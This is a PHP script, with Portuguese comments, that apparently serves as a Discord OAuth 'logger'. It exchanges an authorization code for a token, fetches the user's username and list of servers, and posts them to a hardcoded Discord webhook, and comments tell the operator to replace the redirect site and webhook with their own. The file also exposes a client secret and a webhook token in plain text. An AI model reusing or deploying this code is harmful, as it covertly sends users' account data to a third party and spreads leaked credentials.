<?php
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
    if (isset($_GET["error"])) {
        echo json_encode(array("message" => "Authorization Error"));
    } elseif (isset($_GET["code"])) {
        $redirect_uri = "https://depressed-preserver.000webhostapp.com/"; // aq tu vai colocar o mesmo site q tu colocou no redirect
        $token_request = "https://discordapp.com/api/oauth2/token";
        $token = curl_init();
        curl_setopt_array($token, array(
            CURLOPT_URL => $token_request,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => array(
                "grant_type" => "authorization_code",
                "client_id" => "512722487424057344",
                "client_secret" => "8QPhivGnAm5Jm8kFOLdAH8pD9ScZzM48",
                "redirect_uri" => $redirect_uri,
                "code" => $_GET["code"]
            )
        ));
        curl_setopt($token, CURLOPT_RETURNTRANSFER, true);
        $resp = json_decode(curl_exec($token));
        curl_close($token);
        if (isset($resp->access_token)) {
            $access_token = $resp->access_token;
            $info_request = "https://discordapp.com/api/users/@me/guilds";
            $info = curl_init();
            curl_setopt_array($info, array(
                CURLOPT_URL => $info_request,
                CURLOPT_HTTPHEADER => array(
                    "Authorization: Bearer {$access_token}"
                ),
                CURLOPT_RETURNTRANSFER => true
            ));
            $user = json_decode(curl_exec($info));
            curl_close($info);
            $access_token2 = $resp->access_token;
            $info_request2 = "https://discordapp.com/api/users/@me";
            $info2 = curl_init();
            curl_setopt_array($info2, array(
                CURLOPT_URL => $info_request2,
                CURLOPT_HTTPHEADER => array(
                    "Authorization: Bearer {$access_token2}"
                ),
                CURLOPT_RETURNTRANSFER => true
            ));

            $user2 = json_decode(curl_exec($info2));
            curl_close($info2);

            $id_array = array_column($user, 'name');
            $url = "https://discordapp.com/api/webhooks/512719807599345684/ENwAE9NVMbKMmxlePNFWHx5_aHh6Yi6PG31rl66G7XBxl_JrDQJrfyZwfqOpfhHeGDtT"; // troque o link do webhook aqui
            $strxx = implode("\n", $id_array);
$hookObject = json_encode([
   // "content" => "{$user2->username}#{$user2->discriminator}",
    "username" => "Servidores",
    "avatar_url" => "https://vgy.me/0hYd9w.png",
    "tts" => false,
    "embeds" => [
        
        [
            "title" => "Servidores em que o usuário {$user2->username}#{$user2->discriminator} esta presente !",

            "type" => "rich",

            "description" => "{$strxx}",

            "color" => hexdec( "FFFFFF" ),
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Length" => strlen( $hookObject ),
        "Content-Type" => "application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );
                } else {
            echo json_encode(array("message" => "Authentication Error"));
        }
    } else {
        echo json_encode(array("message" => "No Code Provided"));
    }
?>